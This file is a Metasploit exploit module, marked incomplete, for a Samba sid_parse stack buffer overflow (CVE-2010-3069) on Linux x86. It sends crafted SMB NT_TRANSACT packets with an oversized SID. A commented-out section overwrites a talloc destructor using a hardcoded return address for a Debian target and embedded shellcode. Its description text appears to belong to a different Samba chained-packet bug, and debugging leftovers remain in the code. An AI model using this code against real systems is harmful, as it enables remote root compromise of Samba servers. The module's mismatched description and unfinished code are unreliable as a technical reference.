##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Brute

	def initialize(info = {})
		super(update_info(info,
			'Name'           => '[INCOMPLETE] Samba sid_parse Stack Buffer Overflow (Linux x86)',
			'Description'    => %q{

=begin
					This exploits a memory corruption vulnerability present in Samba versions
				prior to 3.3.13. When handling chained response packets, Samba fails to validate
				the offset value used when building the next part. By setting this value to a
				number larger than the destination buffer size, an attacker can corrupt memory.
				Additionally, setting this value to a value smaller than 'smb_wct' (0x24) will
				cause the header of the input buffer chunk to be corrupted.

				After close inspection, it appears that 3.0.x versions of Samba are not
				exploitable. Since they use an "InputBuffer" size of 0x20441, an attacker cannot
				cause memory to be corrupted in an exploitable way. It is possible to corrupt the
				heap header of the "InputBuffer", but it didn't seem possible to get the chunk
				to be processed again prior to process exit.

				In order to gain code execution, this exploit attempts to overwrite a "talloc
				chunk" destructor function pointer.

				This particular module is capable of exploiting the flaw on x86 Linux systems
				that do not have the nx memory protection.

				NOTE: It is possible to make exploitation attempts indefinitely since Samba forks
				for user sessions in the default configuration.
=end
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2010-3069' ],
					[ 'URL', 'http://us1.samba.org/samba/security/CVE-2010-3069.html' ]
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 0x600,
					'BadChars' => "",
				},
			'Platform'       => 'linux',
			'Targets'        =>
				[
					[ 'Linux (Debian5 3.2.5-4lenny6)',
						{
							'Offset2'      => 0x1fec,
							'Bruteforce'   =>
								{
									'Start' => { 'Ret' => 0x081ed5f2 }, # jmp ecx (smbd bin)
									'Stop'  => { 'Ret' => 0x081ed5f2 },
									'Step'  => 0x300 # not used
								}
						}
					],

					[ 'Debugging Target',
						{
							'Offset2'      => 0x1fec,
							'Bruteforce'   =>
								{
									'Start' => { 'Ret' => 0xAABBCCDD },
									'Stop'  => { 'Ret' => 0xAABBCCDD },
									'Step'  => 0x300
								}
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 16 2010'))

		register_options(
			[
				Opt::RPORT(139),
				OptString.new('SMBSHARE', [ true,  "The share name to use", nil]),
			], self.class)
	end

=begin

	#
	# Note: this code is duplicated from lib/rex/proto/smb/client.rb
	#
	# Authenticate using clear-text passwords
	#
	def session_setup_clear_ignore_response(user = '', pass = '', domain = '')

		data = [ pass, user, domain, self.simple.client.native_os, self.simple.client.native_lm ].collect{ |a| a + "\x00" }.join('');

		pkt = CONST::SMB_SETUP_LANMAN_PKT.make_struct
		self.simple.client.smb_defaults(pkt['Payload']['SMB'])

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_SESSION_SETUP_ANDX
		pkt['Payload']['SMB'].v['Flags1'] = 0x18
		pkt['Payload']['SMB'].v['Flags2'] = 0x2001
		pkt['Payload']['SMB'].v['WordCount'] = 10
		pkt['Payload'].v['AndX'] = 255
		pkt['Payload'].v['MaxBuff'] = 0xffdf
		pkt['Payload'].v['MaxMPX'] = 2
		pkt['Payload'].v['VCNum'] = 1
		pkt['Payload'].v['PasswordLen'] = pass.length + 1
		pkt['Payload'].v['Capabilities'] = 64
		pkt['Payload'].v['SessionKey'] = self.simple.client.session_id
		pkt['Payload'].v['Payload'] = data

		self.simple.client.smb_send(pkt.to_s)
		ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)
	end


=end

	def brute_exploit(addrs)

		curr_ret = addrs['Ret']

		connect
		smb_login

		# Open the share
		self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")

		puts "press any key"; $stdin.gets

		# Open the working directory
		disposition = 1
		impersonation = 2
		filename = "\\"

		pkt = CONST::SMB_CREATE_PKT.make_struct
		self.simple.client.smb_defaults(pkt['Payload']['SMB'])

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_CREATE_ANDX
		pkt['Payload']['SMB'].v['Flags1'] = 0x18
		pkt['Payload']['SMB'].v['Flags2'] = 0x2001
		pkt['Payload']['SMB'].v['WordCount'] = 24

		pkt['Payload'].v['AndX'] = 255
		pkt['Payload'].v['FileNameLen'] = filename.length
		pkt['Payload'].v['CreateFlags'] = 3
		pkt['Payload'].v['AccessMask'] = CONST::OPEN_ACCESS_READ
		pkt['Payload'].v['ShareAccess'] = 7
		pkt['Payload'].v['CreateOptions'] = 0
		pkt['Payload'].v['Impersonation'] = impersonation
		pkt['Payload'].v['Disposition'] = disposition
		pkt['Payload'].v['Payload'] = filename + "\x00"

		ret = self.simple.client.smb_send(pkt.to_s)
		ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_NT_CREATE_ANDX)

		fid = nil
		# Save off the FileID
		if (ack['Payload'].v['FileID'] > 0)
			fid = ack['Payload'].v['FileID']
		end

=begin
		res = self.simple.client.create("\\")
		fid = res['Payload'].v['FileID']
=end

		sid_rev_num   = 1
		sid_num_auths = 0xff
		sid = "A" * 4
		sid << [ sid_rev_num, sid_num_auths ].pack('CC')
		sid << "ABCDEF" # id_auth[6]
		sid << Rex::Text.pattern_create( 0x40 )

		#sid = [ sid_rev_num, sid_num_auths ].pack('CC')
		#sid << "A"

		#
		# Send a NTTrans request for FindFilesBySID
		#
		subcommand   = 2 # IOCTL
		param        = ''
		body         = sid
		setup_count  = 4
		#setup_data   = [CONST::NT_TRANSACT_IOCTL, 0x9008f, fid].pack('vVv')
		setup_data   = [7, 0x9008f, fid].pack('vVv')

		param =  [0].pack("N") # Four bytes of unknown
		param += sid
		data = param + body

		pkt = CONST::SMB_NTTRANS_PKT.make_struct
		self.simple.client.smb_defaults(pkt['Payload']['SMB'])

		base_offset = pkt.to_s.length + (setup_count * 2) - 4
		param_offset = base_offset
		data_offset = param_offset + param.length

		pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_NT_TRANSACT
		pkt['Payload']['SMB'].v['Flags1'] = 0x18
		pkt['Payload']['SMB'].v['Flags2'] = 0x2001
		pkt['Payload']['SMB'].v['WordCount'] = 19 + setup_count

		pkt['Payload'].v['ParamCountTotal'] = param.length
		pkt['Payload'].v['DataCountTotal'] = body.length
		pkt['Payload'].v['ParamCountMax'] = 1024
		pkt['Payload'].v['DataCountMax'] = 65504
		pkt['Payload'].v['ParamCount'] = param.length
		pkt['Payload'].v['ParamOffset'] = param_offset
		pkt['Payload'].v['DataCount'] = body.length
		pkt['Payload'].v['DataOffset'] = data_offset
		pkt['Payload'].v['SetupCount'] = setup_count
		pkt['Payload'].v['SetupData'] = setup_data
		pkt['Payload'].v['Subcommand'] = subcommand

		pkt['Payload'].v['Payload'] = data

		self.simple.client.smb_send(pkt.to_s)
		ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_NT_TRANSACT)

		handler

=begin

		begin
			connect

		#select(nil,nil,nil,2)

			#
			# This allows us to allocate a talloc_chunk after the input buffer.
			# If doing so fails, we are lost ...
			#
			10.times {
				session_setup_clear_ignore_response('', '', '')
			}

				# We re-use a pointer from the stack and jump back to our original "inbuf"
				distance = target['Offset2'] - 0x80
				jmp_back = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{distance}").encode_string

				tlen = 0xc00
				trans =
					"\x00\x04" +
					"\x08\x20" +
					"\xff"+"SMB"+
					# SMBlogoffX
					[0x74].pack('V') +
					# tc->next, tc->prev
					jmp_back + ("\x42" * 3) +
					#("A" * 4) + ("B" * 4) +
					# tc->parent, tc->child
					"CCCCDDDD" +
					# tc->refs, must be zero
					("\x00" * 4) +
					# over writes tc->destructor
					[addrs['Ret']].pack('V') +
					"\x00\x00\x00\x00"+
					"\xd0\x07\x0c\x00"+
					"\xd0\x07\x0c\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\xd0\x07"+
					"\x43\x00\x0c\x00"+
					"\x14\x08\x01\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x00\x00"+
					"\x00\x00\x90"

					# We put the shellcode first, since only part of this packet makes it into memory.
					trans << payload.encoded
					trans << rand_text(tlen - trans.length)

					# Set what eventually becomes 'smb_off2' to our unvalidated offset value.
					smb_off2 = target['Offset2']
					trans[39,2] = [smb_off2].pack('v')

					sock.put(trans)

				rescue EOFError
					# nothing
				rescue => e
					print_error("#{e}")
				end

				handler
				disconnect

				# See if we won yet..
				select(nil,nil,nil, 1)
=end
	end

end

